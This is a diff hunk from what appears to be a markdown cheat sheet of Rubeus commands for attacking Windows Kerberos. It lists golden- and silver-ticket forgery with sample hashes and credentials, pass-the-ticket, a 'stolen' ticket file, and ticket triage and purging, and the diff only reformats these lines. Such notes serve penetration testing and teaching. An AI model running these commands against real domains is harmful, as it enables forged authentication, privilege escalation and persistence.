@@ -485,20 +485,22 @@ Golden:
 ```rubeus.exe golden /aes256:EA2344691D140975946372D18949706857EB9C5F65855B0E159E54260BEB365C /ldap /user:FakeUser123 /printcmd```
 
 Silver:
-```rubeus.exe silver /service:cifs/dc1.ignite.local /rc4:64FBAE31CC352FC26AF97CBDEF151E03 /ldap /creduser:ecorp.lab\Administrator /credpassword:Password01 /user:whoever /krbkey:EA2344691D140975946372D18949706857EB9C5F65855B0E159E54260BEB365C /krbenctype:aes256 /domain:ecorp.lab /ptt```
+```
+rubeus.exe silver /service:cifs/dc1.ignite.local /rc4:64FBAE31CC352FC26AF97CBDEF151E03 /ldap /creduser:ecorp.lab\Administrator /credpassword:Password01 /user:whoever /krbkey:EA2344691D140975946372D18949706857EB9C5F65855B0E159E54260BEB365C /krbenctype:aes256 /domain:ecorp.lab /ptt
+```
 
 #### Maintenance
 Purge all kerberos tickets: ```rubeus.exe purge```
 
-View ticket: 
+- View ticket: 
 
 ```rubeus.exe describe``` AND ```/ticket:doIFNDCCBTCg...bA==``` OR ```/ticket:stolen_users_club.kirbi```
 
-View active tickets by LUID: 
+- View active tickets by LUID: 
 ```rubeus.exe triage```
 ```rubeus.exe triage /luid:0x8f57c```
 
-We can purge by LUID also:
+- We can purge by LUID also:
 ```rubeus.exe purge /luid:0x8f57c```
 
 #### S4U
